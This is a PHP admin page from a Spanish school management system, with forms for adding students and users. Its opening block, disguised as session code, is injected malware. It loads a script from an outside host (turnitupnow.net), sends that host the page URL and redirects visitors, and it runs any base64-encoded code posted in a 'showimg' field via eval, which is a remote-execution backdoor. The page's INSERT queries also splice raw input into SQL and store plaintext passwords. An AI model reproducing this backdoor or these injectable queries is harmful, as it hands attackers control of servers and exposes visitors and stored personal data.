<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['guardaralumno'])) { $result = $db->Execute("INSERT INTO CDE_alumnos(alumne,dni,nacimiento,direccion,poblacion,cp,provincia,telf,movil,email,exp,exppro,estudios) VALUES ('$alumne','$dni','$nacimiento','$direccion','$poblacion','$cp','$provincia','$telf','$movil','$email','$exp','$exppro','$estudios')"); } ?>

<?php if (isset($_GET['guardaruser'])) { $result = $db->Execute("INSERT INTO usuarios (nombre, pass, nivel) VALUES ('$nombre', '$pass', '$nivel')"); } ?>

<p>n_alumno.php</p>

				  <form id="form1" name="form1" method="post" action="index.php?menu=3&sub=2&guardaralumno" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Alumno</td>
                      </tr>
                    </table>
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Alumno</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="alumne" type="text" class="texte_normal" id="alumne" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;DNI</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="dni" type="text" class="texte_normal" id="textfield2" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Nacimiento</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="nacimiento" type="text" class="texte_normal" id="textfield3" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Direccion</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="direccion" type="text" class="texte_normal" id="textfield4" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Poblacion</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="poblacion" type="text" class="texte_normal" id="textfield8" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;CP</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="cp" type="text" class="texte_normal" id="textfield7" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="provincia" type="text" class="texte_normal" id="textfield6" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Telf</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="telf" type="text" class="texte_normal" id="textfield5" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Movil</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="movil" type="text" class="texte_normal" id="textfield14" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Email</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="email" type="text" class="texte_normal" id="textfield13" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Experiencia</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="exp" type="text" class="texte_normal" id="textfield12" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Exp. Profesional</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="exppro" type="text" class="texte_normal" id="textfield11" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Estudios</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="estudios" type="text" class="texte_normal" id="textfield10" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form><br />

				  <form id="form1" name="form1" method="post" action="index.php?menu=3&sub=2&guardaruser" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Usuario</td>
                      </tr>
                    </table>
                                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                      <tr>
                                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                        <td width="170" bgcolor="#F8F8F8"><label>
                                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                                        </label></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contraseña</td>
                                        <td bgcolor="#F8F8F8"><input name="pass" type="text" class="texte_normal" id="textfield10" /></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Permisos</td>
                                        <td bgcolor="#F8F8F8"><label>
                                          <select name="nivel" class="texte_normal" id="nivel">
                                            <option value="1">Admin</option>
                                            <option value="3">Jefe Dpt</option>
                                            <option value="5">Profesor</option>
                                        </select>
                                        </label></td>
                                      </tr>

                                      <tr>
                                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                        <td align="left" bgcolor="#F8F8F8"><label>
                                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                                        </label></td>
                                      </tr>
                                    </table>
                  </form>